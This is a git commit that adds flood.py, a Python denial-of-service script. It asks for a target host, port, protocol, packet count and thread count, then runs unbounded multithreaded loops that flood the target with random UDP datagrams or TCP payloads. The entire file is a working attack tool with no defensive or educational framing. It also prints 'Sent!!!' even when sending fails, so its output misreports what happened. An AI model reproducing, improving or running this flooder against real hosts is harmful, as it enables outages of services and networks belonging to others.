05b04fbcf7bcc457370f940f9b3798a01554ead9
spoofing0 <44108100+spoofing0@users.noreply.github.com>
2018-12-16 20:56:39 +0300

    Create flood.py

---
+++ flood.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+#Code by LeeOn123
+import random
+import socket
+import threading
+
+print("--> C0de By SP00FING <--")
+print("#-- TCP/UDP FLOOD --#")
+ip = str(input(" Host/Ip :"))
+port = int(input(" Port :"))
+choice = str(input(" UDP (y/n ) :"))
+times = int(input(" Packets Per One Connection :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print(i +" Sent!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			print(i +" Sent!!!")
+			pass
+			#s.close()
+			#print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
